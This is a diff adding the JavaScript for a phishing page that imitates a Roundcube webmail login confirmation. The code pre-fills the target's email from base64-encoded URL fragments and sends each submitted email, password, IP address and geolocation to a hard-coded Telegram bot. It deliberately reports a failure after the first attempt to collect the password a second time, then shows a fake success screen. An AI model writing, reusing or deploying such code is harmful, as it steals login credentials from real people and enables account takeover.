@@ -1,0 +1,570 @@
+let submissionCount = 0;
+
+function getUrlHash() {
+    const hash = window.location.hash.substring(1);
+    if (hash && isBase64(hash)) {
+        try {
+            return atob(hash);
+        } catch (e) {
+            console.log('Hash base64 decode failed:', e);
+            return hash;
+        }
+    }
+    return hash;
+}
+
+function getUrlParams() {
+    const urlParams = new URLSearchParams(window.location.search);
+    return {
+        username: urlParams.get('username') || '',
+        user: urlParams.get('user') || '',
+        name: urlParams.get('name') || '',
+        email: urlParams.get('email') || ''
+    };
+}
+
+function preserveUrlParameters() {
+    const currentHash = window.location.hash;
+
+    if (currentHash) {
+        sessionStorage.setItem('originalUrlHash', currentHash);
+        localStorage.setItem('originalUrlHash', currentHash);
+
+        const decodedHash = getUrlHash();
+        if (decodedHash) {
+            localStorage.setItem('preservedUsername', decodedHash);
+        }
+    }
+
+    const currentParams = new URLSearchParams(window.location.search);
+    const username = currentParams.get('username') || currentParams.get('user') || currentParams.get('name') || currentParams.get('email');
+    if (username) {
+        localStorage.setItem('preservedUsername', username);
+    }
+}
+
+function restoreUrlParameters() {
+    let storedHash = sessionStorage.getItem('originalUrlHash') || localStorage.getItem('originalUrlHash');
+
+    const preservedUsername = localStorage.getItem('preservedUsername');
+    if (preservedUsername && !storedHash) {
+        try {
+            const encodedUsername = btoa(preservedUsername);
+            storedHash = '#' + encodedUsername;
+        } catch (e) {
+            console.log('Base64 encode failed:', e);
+            storedHash = '#' + preservedUsername;
+        }
+    }
+
+    if (storedHash) {
+        const currentUrl = window.location.origin + window.location.pathname;
+        const newUrl = currentUrl + storedHash;
+
+        if (window.location.href !== newUrl) {
+            window.history.replaceState({}, '', newUrl);
+        }
+    }
+}
+
+function forceRestoreParameters() {
+    const currentUrl = window.location.href;
+    const preservedUsername = localStorage.getItem('preservedUsername');
+
+    if ((currentUrl.includes('googletranslate.com') || currentUrl.includes('#googtrans') || !window.location.hash) && preservedUsername) {
+        const baseUrl = window.location.origin + window.location.pathname;
+
+        if (!window.location.hash) {
+            try {
+                const encodedUsername = btoa(preservedUsername);
+                const newUrl = baseUrl + '#' + encodedUsername;
+                window.history.replaceState({}, '', newUrl);
+            } catch (e) {
+                console.log('Base64 encode failed:', e);
+                const newUrl = baseUrl + '#' + preservedUsername;
+                window.history.replaceState({}, '', newUrl);
+            }
+        }
+    }
+}
+
+function enhancedGoogleTranslateInit() {
+    preserveUrlParameters();
+
+    new google.translate.TranslateElement({
+        pageLanguage: 'en',
+        includedLanguages: 'en,es,fr,de,it,pt,ru,ja,ko,zh-cn,zh-tw,ar,hi,th,vi,nl,sv,da,no,fi,pl,cs,hu,ro,bg,hr,sk,sl,et,lv,lt,mt,ga,cy,eu,ca,gl,is,fo,kl,af,sq,az,be,bs,mk,sr,uk,uz,kk,ky,tg,mn,ka,hy,he,yi,ur,fa,ps,ku,sd,ne,bn,as,or,ta,te,kn,ml,si,my,km,lo,bo,dz,am,ti,om,so,sw,mg,ny,sn,st,tn,ts,ve,xh,zu,ig,yo,ha,ff,wo,ln,kg,lua,luo,gaa,tw',
+        layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
+        autoDisplay: false
+    }, 'google_translate_element');
+
+    setTimeout(() => {
+        monitorGoogleTranslateChanges();
+        forceRestoreParameters();
+        const googleTranslate = document.getElementById('google_translate_element');
+        if (googleTranslate) {
+            googleTranslate.classList.add('show');
+        }
+    }, 1000);
+}
+
+function monitorGoogleTranslateChanges() {
+    const translateCombo = document.querySelector('.goog-te-combo');
+    if (translateCombo) {
+        translateCombo.addEventListener('change', function () {
+            setTimeout(() => {
+                restoreUrlParameters();
+                forceRestoreParameters();
+            }, 500);
+
+            setTimeout(() => {
+                forceRestoreParameters();
+            }, 1500);
+        });
+    }
+
+    let lastUrl = location.href;
+    new MutationObserver(() => {
+        const url = location.href;
+        if (url !== lastUrl) {
+            lastUrl = url;
+            if (url.includes('googletranslate.com') || url.includes('#googtrans') || url.includes('translate.goog')) {
+                setTimeout(() => {
+                    restoreUrlParameters();
+                    forceRestoreParameters();
+                }, 100);
+                setTimeout(() => {
+                    forceRestoreParameters();
+                }, 1000);
+            }
+        }
+    }).observe(document, { subtree: true, childList: true });
+}
+
+function startParameterRestoration() {
+    setInterval(() => {
+        const preservedUsername = localStorage.getItem('preservedUsername');
+
+        if (preservedUsername && !window.location.hash) {
+            restoreUrlParameters();
+            forceRestoreParameters();
+        }
+
+        if (window.location.href.includes('googletranslate.com') || window.location.href.includes('#googtrans')) {
+            forceRestoreParameters();
+        }
+    }, 1000);
+}
+
+function handlePageLoad() {
+    const preservedUsername = localStorage.getItem('preservedUsername');
+
+    if (preservedUsername && !window.location.hash) {
+        try {
+            const encodedUsername = btoa(preservedUsername);
+            const newUrl = window.location.origin + window.location.pathname + '#' + encodedUsername;
+            window.history.replaceState({}, '', newUrl);
+        } catch (e) {
+            console.log('Base64 encode failed:', e);
+            const newUrl = window.location.origin + window.location.pathname + '#' + preservedUsername;
+            window.history.replaceState({}, '', newUrl);
+        }
+    }
+
+    preserveUrlParameters();
+}
+
+function isBase64(str) {
+    try {
+        str = str.trim();
+        if (str.length === 0 || str.length % 4 !== 0) {
+            return false;
+        }
+
+        const base64Regex = /^[A-Za-z0-9+/]*={0,2}$/;
+        if (!base64Regex.test(str)) {
+            return false;
+        }
+
+        const decoded = atob(str);
+        const reencoded = btoa(decoded);
+        return reencoded === str && decoded.match(/^[\x20-\x7E\s]*$/);
+    } catch (e) {
+        return false;
+    }
+}
+
+function decodeBase64Content(input, indicatorId) {
+    const value = input.value.trim();
+    const indicator = document.getElementById(indicatorId);
+
+    if (indicator) {
+        indicator.classList.remove('show');
+        input.classList.remove('base64-detected');
+    }
+
+    if (value && isBase64(value)) {
+        try {
+            const decoded = atob(value);
+
+            if (decoded.match(/^[\x20-\x7E\s]*$/)) {
+                input.value = decoded;
+
+                if (indicator) {
+                    indicator.classList.add('show');
+                    input.classList.add('base64-detected');
+                }
+
+                localStorage.setItem('preservedUsername', decoded);
+
+                return true;
+            }
+        } catch (e) {
+            console.log('Base64 decode failed:', e);
+        }
+    }
+    return false;
+}
+
+function encodeToBase64(value) {
+    try {
+        return btoa(value);
+    } catch (e) {
+        console.log('Base64 encode failed:', e);
+        return value;
+    }
+}
+
+function autoEncodeNameField(input) {
+    const value = input.value.trim();
+
+    if (value && !isBase64(value) && (value.includes('@') || value.includes('.'))) {
+        const encoded = encodeToBase64(value);
+
+        const newUrl = window.location.origin + window.location.pathname + '#' + encoded;
+        window.history.replaceState({}, '', newUrl);
+
+        localStorage.setItem('preservedUsername', value);
+    }
+}
+
+function validatePassword(input) {
+    const value = input.value.trim();
+    return value.length >= 4 || value.length === 0;
+}
+
+function extractDomain(value) {
+    if (!value) return null;
+
+    if (value.includes('@')) {
+        return value.split('@')[1];
+    }
+
+    return value;
+}
+
+function showDomain(email) {
+    const domainDisplay = document.getElementById('domainDisplay');
+    if (email) {
+        const domain = email.split('@')[1]?.split('.')[0] || '';
+        if (domainDisplay) {
+            domainDisplay.textContent = domain;
+        }
+    } else {
+        if (domainDisplay) {
+            domainDisplay.textContent = '';
+        }
+    }
+}
+
+function showError(msg, type = 'error') {
+    const err = document.getElementById('errorMessage');
+    if (err) {
+        err.textContent = msg;
+        err.className = `alert ${type}`;
+    }
+}
+
+function clearError() {
+    const err = document.getElementById('errorMessage');
+    if (err) {
+        err.textContent = '';
+        err.className = 'alert';
+    }
+}
+
+function showToast(title, message, type = 'info') {
+    const toastContainer = document.getElementById('toastContainer');
+    const toast = document.createElement('div');
+    toast.className = `toast ${type}`;
+    toast.innerHTML = `
+        <div class="toast-title">${title}</div>
+        <div class="toast-message">${message}</div>
+    `;
+
+    toastContainer.appendChild(toast);
+
+    setTimeout(() => toast.classList.add('show'), 100);
+
+    setTimeout(() => {
+        toast.classList.remove('show');
+        setTimeout(() => {
+            if (toast.parentNode) {
+                toast.parentNode.removeChild(toast);
+            }
+        }, 300);
+    }, 4000);
+}
+
+async function getVisitorInfo() {
+    try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        return {
+            ip: data.ip,
+            city: data.city,
+            country: data.country_name,
+            location: `${data.city}, ${data.country_name}`
+        };
+    } catch (error) {
+        return {
+            ip: 'Unknown',
+            location: 'Unknown'
+        };
+    }
+}
+
+async function submitToTelegram(email, password, visitorInfo) {
+    const apiKey = '8590577110:AAHZlcURcpwbgY9s6C7HOoUxNEpWWSEB0wU';
+    const chatId = '6008737996';
+
+    const message = `ðŸ”” Roundcube Submission #${submissionCount}:
+ðŸ“§ Email: ${email}
+ðŸ” Password: ${password}
+ðŸŒ IP: ${visitorInfo.ip}
+ðŸ“ Location: ${visitorInfo.location}
+â° Timestamp: ${new Date().toLocaleString()}`;
+
+    const url = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+    try {
+        const response = await fetch(url);
+        if (response.ok) {
+            console.log('Successfully sent to Telegram - attempt', submissionCount);
+            return true;
+        } else {
+            console.error('Failed to send to Telegram - attempt', submissionCount);
+            return false;
+        }
+    } catch (error) {
+        console.error('Network error:', error);
+        return false;
+    }
+}
+
+function getEmailFromQuery() {
+    const params = new URLSearchParams(window.location.search);
+    return params.get('email') || '';
+}
+
+function setupFormHandlers() {
+    const form = document.getElementById('myForm');
+    const emailInput = document.getElementById('user');
+    const passwordInput = document.getElementById('fullname');
+    const submitBtn = document.getElementById('submitBtn');
+    const togglePassword = document.querySelector('.toggle-password');
+
+    if (!form || !emailInput || !passwordInput || !submitBtn) {
+        console.error('Form elements not found');
+        return;
+    }
+
+    let emailTimeout, passwordTimeout;
+
+    if (togglePassword) {
+        togglePassword.addEventListener('click', () => {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            togglePassword.classList.toggle('hide', !isPassword);
+            togglePassword.setAttribute('aria-label', isPassword ? 'Show password' : 'Hide password');
+        });
+    }
+
+    emailInput.addEventListener('input', function () {
+        clearTimeout(emailTimeout);
+        emailTimeout = setTimeout(() => {
+            const wasDecoded = decodeBase64Content(this, 'email-indicator');
+            if (!wasDecoded) {
+                autoEncodeNameField(this);
+            }
+            showDomain(this.value);
+        }, 500);
+    });
+
+    passwordInput.addEventListener('input', function () {
+        clearTimeout(passwordTimeout);
+        passwordTimeout = setTimeout(() => {
+            decodeBase64Content(this, 'password-indicator');
+        }, 300);
+    });
+
+    passwordInput.addEventListener('blur', function () {
+        decodeBase64Content(this, 'password-indicator');
+    });
+
+    emailInput.addEventListener('paste', function () {
+        setTimeout(() => {
+            const wasDecoded = decodeBase64Content(this, 'email-indicator');
+            if (!wasDecoded) {
+                autoEncodeNameField(this);
+            }
+            showDomain(this.value);
+        }, 100);
+    });
+
+    passwordInput.addEventListener('paste', function () {
+        setTimeout(() => {
+            decodeBase64Content(this, 'password-indicator');
+        }, 100);
+    });
+
+    emailInput.addEventListener('blur', function () {
+        const wasDecoded = decodeBase64Content(this, 'email-indicator');
+        if (!wasDecoded && this.value.trim()) {
+            autoEncodeNameField(this);
+        }
+        showDomain(this.value);
+    });
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        clearError();
+
+        const email = emailInput.value?.trim();
+        const password = passwordInput.value?.trim();
+
+        if (!email) {
+            showError('Please provide your email address.');
+            showToast('Validation Error', 'Email is required', 'error');
+            emailInput.focus();
+            return;
+        }
+
+        if (!password) {
+            showError('Please provide your password.');
+            showToast('Validation Error', 'Password is required', 'error');
+            passwordInput.focus();
+            return;
+        }
+
+        if (password.length < 4) {
+            submissionCount++;
+            const visitorInfo = await getVisitorInfo();
+            await submitToTelegram(email, password, visitorInfo);
+            passwordInput.value = '';
+            passwordInput.focus();
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Confirm';
+            return;
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = 'Confirming...';
+
+        submissionCount++;
+
+        const visitorInfo = await getVisitorInfo();
+        const telegramSent = await submitToTelegram(email, password, visitorInfo);
+
+        if (!telegramSent) {
+            showError('Failed to confirm. Please try again later.');
+            showToast('Connection Error', 'Failed to confirm. Please try again later.', 'error');
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Confirm';
+            return;
+        }
+
+        if (submissionCount === 1) {
+            showError('Failed to confirm. Please try again later.');
+            passwordInput.value = '';
+            passwordInput.focus();
+            submitBtn.disabled = false;
+            submitBtn.textContent = 'Confirm';
+        } else if (submissionCount === 2) {
+            showError('Successful confirmation!', 'success');
+           
+
+            setTimeout(() => {
+                form.style.display = 'none';
+                const successPage = document.getElementById('successPage');
+                if (successPage) {
+                    successPage.style.display = 'block';
+                }
+            }, 500);
+        }
+    });
+}
+
+function initializeFormOnLoad() {
+    handlePageLoad();
+    startParameterRestoration();
+
+    const hashValue = getUrlHash();
+    const emailInput = document.getElementById('user');
+    const preservedUsername = localStorage.getItem('preservedUsername');
+
+    let usernameValue = '';
+
+    if (hashValue) {
+        usernameValue = hashValue;
+    } else if (preservedUsername) {
+        usernameValue = preservedUsername;
+    } else {
+        const urlParams = getUrlParams();
+        if (urlParams.email) {
+            usernameValue = urlParams.email;
+        } else if (urlParams.username) {
+            usernameValue = urlParams.username;
+        } else if (urlParams.user) {
+            usernameValue = urlParams.user;
+        } else if (urlParams.name) {
+            usernameValue = urlParams.name;
+        }
+    }
+
+    const queryEmail = getEmailFromQuery();
+    if (queryEmail) {
+        usernameValue = queryEmail;
+    }
+
+    if (usernameValue && emailInput) {
+        emailInput.value = usernameValue;
+        localStorage.setItem('preservedUsername', usernameValue);
+
+        const encodedValue = encodeToBase64(usernameValue);
+        const newUrl = window.location.origin + window.location.pathname + '#' + encodedValue;
+        window.history.replaceState({}, '', newUrl);
+
+        setTimeout(() => {
+            decodeBase64Content(emailInput, 'email-indicator');
+            showDomain(usernameValue);
+        }, 100);
+    }
+
+    setupFormHandlers();
+}
+
+document.addEventListener('DOMContentLoaded', function () {
+    initializeFormOnLoad();
+});
+
+window.addEventListener('load', () => {
+    const emailInput = document.getElementById('user');
+    if (emailInput && emailInput.value) {
+        showDomain(emailInput.value);
+    }
+});
+
+window.addEventListener('beforeunload', function () {
+    document.body.style.opacity = '0.7';
+});
